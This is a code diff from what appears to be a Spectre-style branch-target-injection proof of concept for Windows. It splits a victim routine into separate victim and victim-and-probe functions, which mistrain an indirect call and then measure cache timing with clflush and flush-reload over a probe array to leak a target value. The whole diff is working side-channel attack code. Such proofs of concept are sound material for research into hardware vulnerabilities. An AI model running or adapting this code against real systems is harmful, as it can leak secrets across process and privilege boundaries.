@@ -52,34 +52,41 @@ DWORD WINAPI TrainingThread(LPVOID) {
   }
 }
 
-void victim_thread(const void *target, bool do_probe) {
+void victim(const void *target) {
+  void (*target_proc)(uint8_t*, uint8_t*) = do_nothing;
+  void *call_destination = reinterpret_cast<void*>(&target_proc);
+
+  for (;;) {
+    for (int trial = 0; trial < 20000; ++trial) {
+      Sleep(1);
+#if 1
+      // This is strange.  For some reason, flushing the probe on the victim side
+      // helps getting repro.  Need to find a way to get rid of this hack later.
+      for (int i = 0; i < probe_lines; ++i)
+        _mm_clflush(&probe[i * 4096]);
+#else
+      evict(junk, 10 * 1024, 2048);
+#endif
+      IndirectCall(call_destination, target, probe);
+    }
+  }
+}
+
+void victim_and_probe(const void *target) {
   void (*target_proc)(uint8_t*, uint8_t*) = do_nothing;
   void *call_destination = reinterpret_cast<void*>(&target_proc);
 
   for (;;) {
     for (int trial = 0; trial < 20000; ++trial) {
       Sleep(10);
-      if (do_probe) {
-#if 0
-        for (int i = 0; i < probe_lines; ++i)
-          _mm_clflush(&probe[i * 4096]);
-#else
-        evict(junk, 10 * 1024, 2048);
-#endif
-      }
-      else {
 #if 1
-        // This is strange.  For some reason, flushing the probe on the victim side
-        // helps getting repro.  Need to find a way to get rid of this hack later.
-        for (int i = 0; i < probe_lines; ++i)
-          _mm_clflush(&probe[i * 4096]);
+      for (int i = 0; i < probe_lines; ++i)
+        _mm_clflush(&probe[i * 4096]);
 #else
-        evict(junk, 10 * 1024, 2048);
+      evict(junk, 10 * 1024, 2048);
 #endif
-      }
 
       IndirectCall(call_destination, target, probe);
-      if (!do_probe) continue;
 
       for (int i = 0; i < probe_lines; ++i)
         tat[i] = flush_reload(probe + i * 4096);
@@ -155,7 +162,10 @@ int main(int argc, char *argv[]) {
     else
       printf("Starting the victim thread on cpu#%d...\n\n", affinity_victim);
     SetThreadAffinityMask(GetCurrentThread(), 1 << affinity_victim);
-    victim_thread(TheAnswer + offset, modes.probe);
+    if (modes.probe)
+      victim_and_probe(TheAnswer + offset);
+    else
+      victim(TheAnswer + offset);
   }
   else if (modes.train) {
     if (!JailbreakMemoryPage(Touch)) {
